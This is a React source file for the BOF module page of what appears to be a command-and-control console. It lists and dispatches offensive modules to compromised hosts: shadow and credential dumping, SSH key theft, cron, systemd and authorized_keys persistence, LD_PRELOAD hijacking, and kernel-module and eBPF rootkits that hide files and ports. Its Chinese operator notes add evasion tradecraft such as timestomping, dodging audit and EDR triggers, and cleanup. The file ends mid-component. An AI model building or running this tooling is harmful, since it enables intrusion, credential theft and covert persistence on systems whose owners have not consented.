import { useCallback, useEffect, useMemo, useRef, useState } from 'react'
import { useStore } from '../store'
import { bytesToB64, copyText, fileToB64, isAgentOnline, isLinuxAgent } from '../utils'
import { clearCompletionCache } from '../lib/completions'
import { EmptyState } from './ui'
import { PageTips } from './PageTips'

/* BOF 模块页。
 *
 * ★ 批次20 的两处结构性修正：
 *
 *   1) **动态识别**。原来这里是硬编码的 18 条数组，而服务端实际有 26 个 .o。
 *      硬编码的后果不是「少显示几个」那么轻——它意味着**任何新增/上传的 BOF
 *      在页面上根本不存在**，只能手敲 `execute bof <路径>`。
 *      现在列表来自 `GET /api/bofs/list`，服务端有几个就显示几个。
 *
 *   2) **上传 + 编译**。`.c` 上传后自动编译（配方与 tools/deploy.sh 逐字同源，
 *      见 pl_bofs_api.go 的 gcc 调用点），`.o` 可直接投递。
 *
 * ★ 本地这份 META 只放「给人看的元数据」——分类、描述、参数表、用法提示。
 *   **不**放文件名、**不**放「有哪些模块」，那两样一律以服务端为准。
 *   这样「服务端加了 BOF 页面看不见」这类漂移在结构上就不可能发生。
 *
 * ★ 批次 22 的两处补充：
 *
 *   1) **`notes` = 实战落地用法**。参数表只回答"填什么"，回答不了"什么时候
 *      能跑、跑了会怎样、跟谁有顺序"——而 26 个模块里有相当一部分的失败方式
 *      是**静默**的（参数错位照跑、hide 表满了只返 -1、pin unlink 后 fd 取不
 *      回来）。这些约束原本只写在各自的 .c 头注释里，操作员在控制台上看不见。
 *      约定：以 ★ 开头的条目是"忽略会造成不可逆后果或静默错误"的那一条。
 *
 *   2) **`kind: 'int'`**。BOF 的参数流是混合的：`BeaconDataExtract` 读
 *      `[4B 长度][内容]`，而 `BeaconDataInt` 读**裸的 4 字节**。ebpf_load 的
 *      prog_type / attach 是后者。此前页面把所有参数都按长度前缀打包，
 *      于是这两个字段必然错位——而且错位不报错。
 */

type Cat = 'recon' | 'priv' | 'cred' | 'persist' | 'stealth' | 'exec' | 'other'
type ParamDef = {
  key: string
  label: string
  placeholder: string
  required?: boolean
  /** 'int' = 打包成**裸 4 字节整数**（BeaconDataInt 读）；默认是 [4B 长度][内容] */
  kind?: 'int' | 'str'
  /** 空白分隔的多个值 → 打包成 **N 个字段**（hide_add / hide_del 的名字列表） */
  multi?: boolean
  /** 空白分隔的多个值 → 打包成 **1 个字段**，值之间用 NUL 连接（ebpf_load 的 names） */
  nulJoin?: boolean
  /** 复选框：勾上才把 placeholder 原样作为一个字段发出（--unlink / --keep） */
  flag?: boolean
}
type BofMeta = { category: Cat; desc: string; notes?: string[]; params?: ParamDef[] }

const META: Record<string, BofMeta> = {
  // ── 侦察 ──
  host_recon: {
    category: 'recon', desc: '主机信息汇总：内核/发行版/CPU/内存/网卡/用户',
    notes: [
      '只读、不落盘，任何时候都能安全重跑；回执很长（含用户/组/登录历史/crontab）',
      '拿到的内核版本是选提权路线的输入 —— 接着喂给 kernel_exploit_check',
    ],
  },
  proc_enum: {
    category: 'recon', desc: '枚举全部进程（PID/PPID/路径/用户）',
    notes: [
      '只读 /proc：线程 / fd / cmdline / maps / cwd，输出量很大',
      '动手做持久化之前先看这里：有没有 EDR、auditd、抓包进程在盯',
    ],
  },
  net_enum: {
    category: 'recon', desc: '网络枚举：接口/路由/监听端口',
    notes: [
      '只读：接口 / 路由 / ARP / DNS / 连接表',
      '横向前的第一步；配合 ebpf_load 的 ports 参数，确认哪些端口已经藏起来',
    ],
  },
  service_enum: {
    category: 'recon', desc: '服务枚举：systemd 单元/开机项',
    notes: [
      '只读：systemd 单元 + init 脚本，用来找能借壳的常驻服务',
      '装 systemd_persist 之前先跑一遍，留一份"原本长什么样"的基线',
    ],
  },
  container_detect: {
    category: 'recon', desc: '容器/虚拟化环境检测',
    notes: [
      '只读：判断在不在容器/虚拟机里，并给出逃逸线索',
      '容器里做的持久化重启即失 —— 先确认自己在哪一层，再决定往哪落',
    ],
  },
  kernel_exploit_check: {
    category: 'recon', desc: '内核版本 vs 已知提权 exploit 匹配',
    notes: [
      '只读：内核版本 vs 内置提权 CVE 表（含 DirtyPipe 等）',
      '★ 回执末尾那行 MATRIX:kver=…|btf=…|kconfig=… 是喂给载荷矩阵解析器的，别丢',
    ],
  },
  // ── 提权 ──
  sudo_check: {
    category: 'priv', desc: 'sudo 配置检查（-l / 无密码项 / env_keep）',
    notes: [
      '只读解析 sudoers，不改配置；等价于 sudo -l 但不产生 execve',
      '重点看 NOPASSWD 项和 env_keep —— LD_PRELOAD/PYTHONPATH 类可以直接提权',
    ],
  },
  suid_scan: {
    category: 'priv', desc: 'SUID 二进制扫描（GTFOBins 候选）',
    notes: [
      '只读，但要遍历整个文件系统 —— 慢，建议勾异步 -a',
      '命中的二进制会直接标出 GTFOBins 用法',
    ],
  },
  ld_preload_check: {
    category: 'priv', desc: 'LD_PRELOAD 利用面检查',
    notes: [
      '只读：LD_PRELOAD 环境变量 + /etc/ld.so.preload + 可疑 .so',
      '装 ld_preload_install 前后各跑一次，确认落点、也确认没被别人占坑',
    ],
  },
  shadow_dump: {
    category: 'priv', desc: '读取 /etc/shadow（需 root）',
    notes: [
      '★ 需要 root：非 root 直接报错返回，不会给半截数据',
      '拿到就离线破解；在线爆破会在目标机上留 auth 日志，别在那台机上做',
    ],
  },
  // ── 凭据 ──
  cred_harvest: {
    category: 'cred', desc: '凭据收集：history/bashrc/env/常见密钥',
    notes: [
      '★ 要扫全部用户需要 root；非 root 只能看当前用户的',
      '比内置 creds 多扫 terraform / vault / npm / pip / git，并提取云 IMDS 地址',
    ],
  },
  ssh_keys: {
    category: 'cred', desc: 'SSH 私钥/authorized_keys 收集',
    notes: [
      '★ 要覆盖全部用户需要 root',
      '拿到私钥顺手看 known_hosts —— 那是一张现成的横向地图',
    ],
  },
  // ── 维持 ──
  cron_persist: {
    category: 'persist', desc: 'crontab 持久化（含 timestomp）',
    notes: [
      '落 /etc/cron.d/<任务名>（默认 sys-update），chmod 0600 且 mtime 对齐目录 mtime',
      '★ 落地产物在"加载之后"才出现，ebpf_load 的 names 覆盖不到 —— 本命令会自己补登记进 hide_names',
      '现代发行版可能根本没装 cron（Ubuntu 24.04 默认无）——先 service_enum 确认',
    ],
    params: [
      { key: 'command', label: '命令', placeholder: '/tmp/x', required: true },
      { key: 'job_name', label: '任务名', placeholder: 'agent_update' },
    ],
  },
  ssh_persist: {
    category: 'persist', desc: 'authorized_keys 后门（追加公钥）',
    notes: [
      '默认写 /root/.ssh/authorized_keys（目录 0700 / 文件 0600）；第二参数给 AuthorizedKeysFile 非默认位置的机器用',
      '★ 刻意**不**把 authorized_keys 登记进 hide_names：它看不见反而反常，是判断不是遗漏',
      '追加完用 ssh -i 实测一次再走，别只看回执',
    ],
    params: [
      { key: 'pubkey', label: '公钥行', placeholder: 'ssh-rsa AAAA...', required: true },
      { key: 'target_path', label: '目标文件', placeholder: '/root/.ssh/authorized_keys' },
    ],
  },
  ld_preload_install: {
    category: 'persist', desc: 'LD_PRELOAD 劫持安装（.so 需已投递到目标机）',
    notes: [
      '★ .so 必须**已经投递到目标机**上，本命令只负责把路径写进 /etc/ld.so.preload',
      'ld.so.preload 在发行版里默认不存在，它的出现本身就是 IOC —— 本命令会自己把它登记进 hide_names',
      '只影响之后新起的进程；已经在跑的进程不受影响',
    ],
    params: [{ key: 'so_path', label: '目标机 .so 路径', placeholder: '/tmp/evil.so', required: true }],
  },
  ko_load: {
    category: 'persist', desc: '内核模块加载（finit_module，.ko 需已投递）',
    notes: [
      '★ .ko 必须与目标内核 vermagic 匹配（由载荷矩阵挑选），不是随便一个 .ko',
      '需要 CAP_SYS_MODULE；lockdown / 模块签名强制会挡，报错码能区分原因',
      '用 finit_module 直接加载而不是 execve insmod —— 少一条 execve 审计事件',
      '加载成功后自动把模块名登记进 hide_names',
    ],
    params: [{ key: 'ko_path', label: '目标机 .ko 路径', placeholder: '/tmp/rootkit.ko', required: true }],
  },
  ebpf_load: {
    category: 'persist', desc: 'eBPF 程序加载（原始指令流，九个位置参数）',
    notes: [
      '★ 必须勾异步 -a：加载 + attach 是长任务，同步会卡住 agent 的命令循环',
      'insns.bin / mapreloc 由 build_bpf.sh 产出，必须先投递到目标机',
      '★ prog_type / attach 是整数（标了「整数」的那两个）。控制台那行的兜底打包只认字符串，发不出整数 —— 这两个字段只有本页「执行」能给对',
      '★ pin 名要记住：ebpf_unload / hide_add / hide_del 全靠它；pin 自己也会被自动藏起来，之后再 ls 是找不到的',
    ],
    params: [
      { key: 'insns', label: '指令文件', placeholder: '/tmp/hide.insns.bin', required: true },
      { key: 'mapreloc', label: 'mapreloc', placeholder: '/tmp/hide.mapreloc.txt' },
      { key: 'prog_type', label: 'prog_type', placeholder: '5', required: true, kind: 'int' },
      { key: 'attach', label: 'attach', placeholder: '1', required: true, kind: 'int' },
      { key: 'target', label: 'attach 目标', placeholder: 'syscalls/sys_exit_getdents64' },
      { key: 'names', label: '隐藏名', placeholder: 'sys-update', nulJoin: true },
      { key: 'ports', label: '隐藏端口', placeholder: '8443,9001' },
      { key: 'key16', label: 'knock 密钥', placeholder: '16 字节原文' },
      { key: 'pin', label: 'pin 名', placeholder: 'ax-rootkit', required: true },
    ],
  },
  systemd_persist: {
    category: 'persist', desc: 'systemd timer 持久化单元',
    notes: [
      '落地三件缺一不可：<名>.service + <名>.timer + timers.target.wants/<名>.timer 符号链接；少一个链接就是"看得见但永远不会跑"',
      '★ 不 execve systemctl enable / daemon-reload（少一条 execve 审计 + 一条 journal 记录）；要本次就生效得自己在目标机上 reload',
      '★ 同名单元已存在时拒绝覆盖 —— 覆盖系统单元会直接破坏目标机',
      '单元文件 mtime 对齐目录，且带 RandomizedDelaySec（真实发行版定时器的常见形态）',
    ],
    params: [
      { key: 'command', label: '命令', placeholder: '/tmp/x', required: true },
      { key: 'unit_name', label: '单元名', placeholder: 'sys-maintenance' },
    ],
  },
  // ── 执行 ──
  memfd_exec: {
    category: 'exec', desc: '无文件执行 ELF（fork 隔离；路径是目标机上的）',
    notes: [
      '载荷在**子进程**里跑：它崩了不会带走 agent；但父进程会 waitpid 到载荷退出为止',
      '载体首选 tmpfs 文件（写完立刻 unlink），memfd 只是拿不到 tmpfs 时的回退',
      '★ --unlink 先删源文件再 execve；载荷矩阵的自动投递链用的就是这条',
    ],
    params: [
      { key: 'target_path', label: '目标机 ELF 路径', placeholder: '/tmp/payload.elf', required: true },
      { key: 'unlink', label: '跑完删源', placeholder: '--unlink', flag: true },
    ],
  },
  spawn_detached: {
    category: 'exec', desc: '把 ELF 丢成"无父、无盘、无 fd"的后台进程',
    notes: [
      '★ 路径是**目标机上已有的** ELF；默认跑完立刻 unlink 源，--keep 只用于测试',
      '★ 父进程只等中间子进程（秒退），不等载荷 —— agent 不会被拖住，载荷活多久都不影响心跳',
      '/proc/<pid>/{exe,maps,fd} 显示 "<tmpfs>/.mXXXX (deleted)"，且不产生 memfd_create 这个 EDR 触发点',
    ],
    params: [
      { key: 'elf', label: '目标机 ELF', placeholder: '/tmp/payload.elf', required: true },
      { key: 'argv0', label: 'argv0', placeholder: 'kworker/0:1-events' },
      { key: 'keep', label: '保留源文件', placeholder: '--keep', flag: true },
    ],
  },
  matrix_pick: {
    category: 'exec', desc: '载荷矩阵查表与完整性校验',
    notes: [
      '校验模式：<manifest 路径> <sha256> <本地文件> → 打 MATRIX_OK / MATRIX_BAD / MATRIX_MISSING',
      '★ 本地这一侧的 sha256 目前是简化占位实现，真正的完整性闸门在服务端 resolver + 下载通道',
    ],
    params: [
      { key: 'kver', label: '内核版本', placeholder: '6.8.0', required: true },
      { key: 'arch', label: '架构', placeholder: 'x86_64', required: true },
      { key: 'kind', label: '类型', placeholder: 'exploit', required: true },
    ],
  },
  // ── 隐匿 · 撤离 ──
  hide_add: {
    category: 'stealth', desc: '事后往 hide_names 补写要隐藏的名字',
    notes: [
      '名字填 dirent 名（文件名/目录名），**不是路径**；多个名字用空格分开',
      '★ 表上限 32 且没有 LRU：写满了 MAP_UPDATE 只返 -1，表现出来就是"隐藏莫名失灵"',
      '★ 加载**之后**才落盘的东西（cron/systemd 单元、pin 自己）必须补写，否则一条 ls 就暴露',
    ],
    params: [
      { key: 'pin', label: 'pin 名', placeholder: 'ax-rootkit', required: true },
      { key: 'names', label: '要隐藏的名', placeholder: 'sys-update sys-maintenance', required: true, multi: true },
    ],
  },
  hide_del: {
    category: 'stealth', desc: '从 hide_names 删回名字（恢复可见 / 回收预算）',
    notes: [
      '只删键、不删对象 —— 删完那个名字重新出现在 ls 里，文件一直都在',
      '★ 要在 pin 还活着的时候用：unpin 之后再按路径就打不开那张 map 了',
      '卸载不需要回收（unpin 后 map 随之销毁）；这里是给手工补写过的名字留的撤销口',
    ],
    params: [
      { key: 'pin', label: 'pin 名', placeholder: 'ax-rootkit', required: true },
      { key: 'names', label: '恢复可见的名', placeholder: 'sys-update', required: true, multi: true },
    ],
  },
  ebpf_unload: {
    category: 'stealth', desc: 'eBPF rootkit 的失效保护卸载',
    notes: [
      '★ 顺序是**先 close 再 unlink**：pin 一旦 unlink，里面的 perf fd 就再也取不回来',
      '★ 排在 evacuate **之后**跑：先把落盘物删干净，最后再恢复可见',
      'pin 与 kprobe_spec 必须跟加载时逐字一致（kprobe 格式 "p:组/名"，卸载时会加 "-:" 前缀）',
    ],
    params: [
      { key: 'pin', label: 'pin 名', placeholder: 'ax-rootkit', required: true },
      { key: 'kprobe', label: 'kprobe 事件', placeholder: 'p:ax_group/ax_tcp4' },
    ],
  },
  evacuate: {
    category: 'stealth', desc: '现场复原 / 撤离（按显式清单删落盘物）',
    notes: [
      "spec 用 ';' 分隔、**按给定顺序**执行：cron:<名> / systemd:<名> / preload:<so路径> / rm:<路径>",
      '幂等：每一步的 ENOENT 都算成功，可以重复下发',
      '★ 不碰 eBPF（那是 ebpf_unload 的活）、**不恢复日志** —— 改写不可逆，且"恢复"动作本身会留下新痕迹',
      '要显式写清单而不是自动扫描：破坏性操作在目标机上没有安全的启发式',
    ],
    params: [
      {
        key: 'spec', label: '撤离清单', required: true,
        placeholder: 'systemd:sys-maintenance;cron:sys-update;preload:/usr/lib/libx.so;rm:/tmp/stage.bin',
      },
    ],
  },
  // ── 其他 ──
  argprobe: {
    category: 'other', desc: '参数编解码探针（零副作用）',
    notes: [
      '只打印参数 blob 的头 4 字节 + 逐个 token；不写盘、不加载 eBPF、不改进程属性',
      '★ 用来判定参数通道有没有 4 字节错位：正常时 head4 应当等于"字段个数"',
    ],
  },
}

const CATS: { key: Cat; label: string }[] = [
  { key: 'recon', label: '侦察' },
  { key: 'priv', label: '提权' },
  { key: 'cred', label: '凭据' },
  { key: 'persist', label: '维持' },
  { key: 'stealth', label: '隐匿 · 撤离' },
  { key: 'exec', label: '执行' },
  { key: 'other', label: '其他' },
]

const UNKNOWN_META: BofMeta = {
  category: 'other',
  desc: '服务端存在、但本地 META 表里没有描述。可能是新加的，或你自己上传的。',
  // 没有参数表 ⇒ 本页只会把「路径」发出去。这不是缺陷而是**保守**：
  // 编不出参数流时宁可一个字段都不发，也不要按猜测的格式发一串错位的垃圾。
  notes: [
    '没有参数表 ⇒ 本页只发路径，参数一律不发；需要带参数的请照该 .c 的 Usage 手敲控制台',
    '要让它在这里可用，往 Bofs.tsx 的 META 里补一条即可（分类 / 描述 / 参数表 / 用法提示）',
  ],
}

/** 服务端 GET /bofs/list 的 entries[] 元素 */
type BofEntry = {
  name: string
  obj: boolean
  obj_size: number
  obj_mtime: number
  obj_sha256: string
  src: boolean
  src_size: number
  src_mtime: number
  stale: boolean
}
type BofRow = BofEntry & { meta: BofMeta; file: string; known: boolean }

const BASE_KEY = 'adaptix.bofs.base.v2'
// 与服务端 pl_bofs_api.go 的 bofsMaxSrcBytes / bofsMaxObjBytes 一致。
// 客户端先拦一道，只是为了给出比「HTTP 413」更清楚的话；真正的闸门在服务端。
const MAX_C = 1 << 20
const MAX_O = 4 << 20

/** 离线兜底：仅在 /api/bofs/list 拿不到时使用，且页面上会明确标出来。
 *  obj:true 是**未经校验的假设**——目的只是让「执行」按钮仍可用（与改造前行为一致），
 *  不代表服务器上真有这个文件。这正是要显式标注的原因。 */
const OFFLINE_ROWS: BofRow[] = Object.keys(META).map((n) => ({
  name: n, obj: true, obj_size: 0, obj_mtime: 0, obj_sha256: '',
  src: false, src_size: 0, src_mtime: 0, stale: false,
  meta: META[n], file: `${n}.o`, known: true,
}))

function fmtSize(n: number) {
  if (!n) return '-'
  if (n < 1024) return `${n} B`
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`
  return `${(n / 1024 / 1024).toFixed(1)} MB`
}

function fmtTime(sec: number) {
  if (!sec) return '-'
  try { return new Date(sec * 1000).toLocaleString() } catch { return '-' }
}

export type BofArg = { kind: 'str' | 'int'; value: string }

/** 按 BOF 侧的 `BeaconDataParse` 约定打包参数流。
 *
 *  ★ 这个函数存在的唯一理由：**blob 的第一个字段是「字段个数」**。
 *
 *  `BeaconDataParse` 的实现是 `buffer += 4; length -= 4`（见 src_agent/agent/
 *  bof_api.c:80-160）—— 它无条件跳过 4 个字节，因为服务器明文回退路径
 *  （pl_main.go:1728-1755）和载荷矩阵解析器（matrix_resolver.go:257-270）都
 *  在流首写了一个 uint32 计数。本页此前没写，于是 `Extract` 把 token 的内容
 *  当成了长度去读，越界检查直接返回 NULL。**BOF 照常运行、照常回报，只是每个参数
 *  都是空的** —— 表现为「BOF 打出自己的 usage / 报缺少参数」，看起来像用法问题。
 *  这就是 ISS-005，本页是三个写入方里最后修的一个。
 *
 *  另一个坑是 `BeaconDataInt` 读的是**裸 4 字节整数**，没有长度前缀。同一个流里
 *  可以混着两种编码（ebpf_load 就是 2 串 + 2 整数 + 5 串），所以每个值自己带 kind。 */
export function packBofArgs(items: BofArg[]): Uint8Array {
  const out: number[] = [0, 0, 0, 0] // 先占位，最后回填字段个数
  const put32 = (n: number) => {
    out.push(n & 0xff, (n >>> 8) & 0xff, (n >>> 16) & 0xff, (n >>> 24) & 0xff)
  }
  let n = 0
  for (const it of items) {
    const v = (it.value || '').trim()
    if (!v) continue // 空值 = 这个字段不存在，而不是「一个空字符串字段」
    if (it.kind === 'int') {
      const num = Number(v)
      if (!Number.isFinite(num)) throw new Error(`需要一个整数，收到 ${JSON.stringify(v)}`)
      put32(num | 0)
    } else {
      const enc = new TextEncoder().encode(v)
      put32(enc.length)
      for (const x of enc) out.push(x)
    }
    n++
  }
  out[0] = n & 0xff
  out[1] = (n >>> 8) & 0xff
  out[2] = (n >>> 16) & 0xff
  out[3] = (n >>> 24) & 0xff
  return new Uint8Array(out)
}

export function Bofs() {
  const agents = useStore((s) => s.agents) || {}
  const api = useStore((s) => s.api)
  const selectedAgentId = useStore((s) => s.selectedAgentId)
  const sendCommand = useStore((s) => s.sendCommand)
  const openConsole = useStore((s) => s.openConsole)
  const pushToast = useStore((s) => s.pushToast)
  const pushLog = useStore((s) => s.pushLog)

  const onlineAgents = useMemo(
    () => Object.values(agents).filter((a: any) => isAgentOnline(a)),
    [agents],
  )
  const [agentId, setAgentId] = useState('')
  const effectiveAgent = agentId || (selectedAgentId && isAgentOnline(agents[selectedAgentId]) ? selectedAgentId : '') || (onlineAgents[0]?.a_id as string) || ''

  const [rows, setRows] = useState<BofRow[]>([])
  const [serverBase, setServerBase] = useState('')
  const [offline, setOffline] = useState(false)
  const [loading, setLoading] = useState(false)
  const [listErr, setListErr] = useState('')
  const [base, setBase] = useState(() => { try { return localStorage.getItem(BASE_KEY) || '' } catch { return '' } })
  const [search, setSearch] = useState('')
  const [paramVals, setParamVals] = useState<Record<string, string>>({})
  const [asyncOn, setAsyncOn] = useState<Record<string, boolean>>({})
  const [busy, setBusy] = useState<string | null>(null)
  const [uploading, setUploading] = useState(false)
  const [compiling, setCompiling] = useState<string | null>(null)
  const [compileAll, setCompileAll] = useState(false)
  const [out, setOut] = useState<{ title: string; text: string; bad: boolean } | null>(null)
  const fileRef = useRef<HTMLInputElement | null>(null)

  const effectiveBase = base.trim() || serverBase

  const load = useCallback(async () => {
    if (!api) return
    setLoading(true)
    setListErr('')
    try {
      const d = await api.get<any>('/api/bofs/list')
      const entries: BofEntry[] = Array.isArray(d?.entries) ? d.entries : []
      setRows(entries.map((e) => {
        const meta = META[e.name]
        return { ...e, meta: meta || UNKNOWN_META, file: `${e.name}.o`, known: !!meta }
      }))
      if (typeof d?.base === 'string' && d.base) setServerBase(d.base)
      setOffline(false)
    } catch (e: any) {
      // 服务端拿不到就退回离线清单，但**必须显式说出来**——
      // 悄悄退回硬编码列表 = 让操作员以为看到的就是全部，正是本次要修的毛病。
      setOffline(true)
      setRows(OFFLINE_ROWS)
      setListErr(String(e?.message || e))
    } finally {
      setLoading(false)
    }
  }, [api])

  useEffect(() => { void load() }, [load])

  /**
   * 告诉命令补全：服务端的 BOF 目录刚变过，别再拿旧清单。
   *
   * ★ 这是缺陷 B 的正解。入口其实一直都在（本页的上传 / 单编 / 全编 / 刷新），
   *   缺的只是「编译完要让补全知道」—— 而 `clearCompletionCache()` 在这之前是
   *   **全仓死代码**（唯一出现就是它自己的定义），所以从代码上完全看不出
   *   补全从不失效。现象就是用户报的那句：「新写好的 BOF 用不上」。
   *
   * 只清缓存不够、还要让**已经挂着的**控制台重取：那由 useCompletion 的
   * `refresh()` 负责（弹层里的「刷新候选」按钮），这里做的是让下一次取数
   * 一定打到服务端而不是缓存。
   */
  function invalidateCompletions() {
    clearCompletionCache()
  }

  function saveBase() {
    try { localStorage.setItem(BASE_KEY, base.trim()) } catch { /* ignore */ }
    pushToast('ok', base.trim() ? 'BOF 基路径已保存' : '已改为跟随服务端')
  }

  function fullPath(b: BofRow) {
    const bstr = effectiveBase.trim()
    if (!bstr) return b.file
    return (bstr.endsWith('/') ? bstr : bstr + '/') + b.file
  }

  const val = (b: BofRow, key: string) => (paramVals[`${b.name}.${key}`] || '').trim()

  /** 表单 → 该 BOF 真正会收到的参数序列。
   *  这里只做「一个输入框 → 几个字段」的展开，编码交给 packBofArgs。 */
  function collectArgs(b: BofRow): BofArg[] {
    const out: BofArg[] = []
    for (const p of b.meta.params || []) {
      if (p.flag) {
        // 勾选框：勾上才把 placeholder 原样发出去（--unlink / --keep 这类开关）
        if (paramVals[`${b.name}.${p.key}`]) out.push({ kind: 'str', value: p.placeholder })
        continue
      }
      const v = val(b, p.key)
      if (!v) continue
      if (p.multi) {
        // 一个框里敲多个值 → N 个字段（hide_add / hide_del 的名字列表）
        for (const t of v.split(/\s+/).filter(Boolean)) out.push({ kind: 'str', value: t })
      } else if (p.nulJoin) {
        // 多个值 → **一个**字段，值之间用 NUL 连接（ebpf_load 的 names）
        out.push({ kind: 'str', value: v.split(/\s+/).filter(Boolean).join('\0') })
      } else {
        out.push({ kind: p.kind === 'int' ? 'int' : 'str', value: v })
      }
    }
    return out
  }

  /** 控制台那行的等价写法。
   *  异步开关的**标记名随 agent 变**：linux_agent 的 ax_config 是
   *  `addArgBool("async")`，beacon/gopher 是 `addArgBool("-a")`。写错的后果不是
   *  「开关没生效」而是**它会被 AxScript 归并进前一个位置参数**（parser.go 的
   *  isWideArgs 分支把剩下的 token 用空格接到 lastKey 上），也就是悄悄污染
   *  param_data。所以这里按 agent 判，不写死。 */
  function asyncMark() {
    return isLinuxAgent(agents[effectiveAgent] as any) ? 'async' : '-a'
  }

  function buildCmdline(b: BofRow): string {
    const parts = [`execute bof ${fullPath(b)}`]
    for (const a of collectArgs(b)) {
      if (a.kind === 'int') { parts.push(a.value); continue }
      // 含空格或 NUL 的值必须引起来：Tokenize 支持双引号，且引号本身会被吃掉
      if (/[\s\0]/.test(a.value)) parts.push(`"${a.value.replace(/\0/g, ' ')}"`)
      else parts.push(a.value)
    }
    if (asyncOn[b.name]) parts.push(asyncMark())
    return parts.join(' ')
  }

  async function runBof(b: BofRow) {
    const id = effectiveAgent
    if (!id) { pushToast('warn', '没有在线主机可选'); return }
    if (!api) { pushToast('err', 'API 未就绪'); return }
    if (!b.obj && !offline) { pushToast('warn', `${b.name}.o 在服务端不存在，先编译或上传`); return }
    for (const p of b.meta.params || []) {
      if (p.required && !p.flag && !val(b, p.key)) {
        pushToast('warn', `缺少必填参数：${p.label}`)
        return
      }
    }

    const cmdline = buildCmdline(b)
    const args = collectArgs(b)
    // 参数打包成 BeaconDataParse 认识的那种 blob（含 4 字节字段个数头）再 base64。
    // 之所以必须 base64：服务端拿到 param_data 会**先试 base64 解码**，解不开才走
    // 「按空格切分纯文本」的兜底 —— 纯文本里的 base64 字符会被那条兜底误解。
    // 解不开或解出来是空 → 走兜底；兜底只认字符串，所以整数参数只能走这条路（本页）。
    let paramData = ''
    if (args.length) {
      try {
        paramData = bytesToB64(packBofArgs(args))
      } catch (e: any) {
        pushToast('err', `参数打包失败：${e?.message || e}`)
        return
      }
    }
    const argObj: Record<string, any> = {
      command: 'execute',
      subcommand: 'bof',
      bof: fullPath(b),
      param_data: paramData,
      async: !!asyncOn[b.name],
    }

    setBusy(b.name)
    try {
      try {
        await api.commandExecute(id, cmdline, argObj, false)
      } catch {
        // 结构化路径失败（旧服务器等）：回退控制台原始命令
        await sendCommand(cmdline)
      }
      pushLog('info', `BOF ${b.name} 已下发 → ${cmdline}`, false)
      openConsole(id)
    } catch {
      pushToast('err', `BOF ${b.name} 下发失败`)
    } finally {
      setBusy(null)
    }
  }

  async function copyCmd(b: BofRow) {
    const ok = await copyText(buildCmdline(b))
    pushToast(ok ? 'ok' : 'err', ok ? '命令已复制' : '复制失败')
  }

  async function onPickFile(ev: React.ChangeEvent<HTMLInputElement>) {
    const f = ev.target.files?.[0]
    ev.target.value = '' // 允许再次选同一个文件
    if (!f || !api) return
    const m = /^(.+)\.(c|o)$/i.exec(f.name)
    if (!m) { pushToast('err', '只接受 .c（源码）或 .o（产物）'); return }
    const name = m[1]
    const kind = m[2].toLowerCase() as 'c' | 'o'
    const cap = kind === 'c' ? MAX_C : MAX_O
    if (f.size > cap) {
      pushToast('err', `${f.name} 有 ${fmtSize(f.size)}，超过 ${kind === 'c' ? '1 MiB（源码）' : '4 MiB（产物）'} 上限`)
      return
    }
    setUploading(true)
    setOut(null)
    try {
      const b64 = await fileToB64(f)
      const res = await api.post<any>('/api/bofs/upload', {
        name, kind, content_b64: b64, overwrite: true, compile: kind === 'c',
      })
      if (kind === 'c' && res?.compiled === false) {
        // 201：文件写进去了但没编过。必须把 gcc 输出摊开给操作员看，
        // 否则「上传成功」这四个字会把人骗过去。
        setOut({ title: `${name}.c 已上传，但编译失败`, text: String(res?.compile?.output || res?.compile?.error || ''), bad: true })
        pushToast('warn', `${name}.c 已上传，但编译失败（见下方输出）`)
      } else {
        pushToast('ok', kind === 'c' ? `${name}.c 已上传并编译` : `${name}.o 已上传`)
      }
      await load()
      invalidateCompletions()
    } catch (e: any) {
      pushToast('err', String(e?.message || e))
    } finally {
      setUploading(false)
    }
  }

  async function compileOne(b: BofRow) {
    if (!api) return
    if (!b.src && !offline) { pushToast('warn', `${b.name}.c 不在服务端，无法重编`); return }
    setCompiling(b.name)
    setOut(null)
    try {
      const res = await api.post<any>('/api/bofs/compile', { name: b.name })
      const r = res?.result || {}
      pushToast('ok', r.changed ? `${b.name} 已重编（产物有变化）` : `${b.name} 已重编（与现有产物字节全同）`)
      if (r.output) setOut({ title: `${b.name} 编译输出`, text: String(r.output), bad: false })
      await load()
      invalidateCompletions()
    } catch (e: any) {
      // 服务端现在把错因 + gcc 输出一起放进 message（见 bofsCompileErrText）
      setOut({ title: `${b.name} 编译失败`, text: String(e?.message || e), bad: true })
      pushToast('err', `${b.name} 编译失败`)
    } finally {
      setCompiling(null)
    }
  }

  async function compileEvery() {
    if (!api) return
    setCompileAll(true)
    setOut(null)
    try {
      const res = await api.post<any>('/api/bofs/compile', { all: true })
      const bad = (res?.results || []).filter((r: any) => !r.ok)
      pushToast(bad.length ? 'warn' : 'ok',
        `全量重编：${res?.n_ok ?? 0}/${res?.count ?? 0} 成功，${res?.n_changed ?? 0} 个产物有变化`)
      if (bad.length) {
        setOut({
          title: `全量重编：${bad.length} 个失败`,
          text: bad.map((r: any) => `── ${r.name} ──\n${r.error || ''}\n${r.output || ''}`).join('\n'),
          bad: true,
        })
      }
      await load()
      invalidateCompletions()
    } catch (e: any) {
      setOut({ title: '全量重编失败', text: String(e?.message || e), bad: true })
      pushToast('err', '全量重编失败')
    } finally {
      setCompileAll(false)
    }
  }

  const filtered = rows.filter((b) => {
    const q = search.trim().toLowerCase()
    if (!q) return true
    // notes 也进搜索：「哪个模块提到 pin / 表满了 / 需要异步」是实际会去搜的东西
    return [b.name, b.file, b.meta.desc, ...(b.meta.notes || [])]
      .some((s) => s.toLowerCase().includes(q))
  })

  const nObj = rows.filter((r) => r.obj).length
  const nStale = rows.filter((r) => r.stale).length
  const nOther = rows.filter((r) => !r.known).length

  return (
    <div className="page">
      <div className="toolbar">
        <h2>BOF 模块</h2>
        <span className="dim" style={{ fontSize: 12 }}>
          {offline
            ? `离线兜底：${rows.length} 个（未与服务端核对）`
            : `服务端 ${rows.length} 个 · 可执行 ${nObj}${nStale ? ` · 源码已改 ${nStale}` : ''}${nOther ? ` · 未登记 ${nOther}` : ''}`}
        </span>
        <span style={{ flex: 1 }} />
        <select
          value={effectiveAgent}
          onChange={(e) => setAgentId(e.target.value)}
          title="目标主机（仅在线）"
        >
          {onlineAgents.length === 0 && <option value="">无在线主机</option>}
          {onlineAgents.map((a: any) => (
            <option key={a.a_id} value={a.a_id}>
              {a.a_computer || a.a_id} ({a.a_username || '-'})
            </option>
          ))}
        </select>
        <button type="button" className="ghost" onClick={() => { void load(); invalidateCompletions() }} disabled={loading || !api} title="重新拉取服务端 BOF 清单（并让命令补全同步失效）">
          {loading ? '…' : '刷新'}
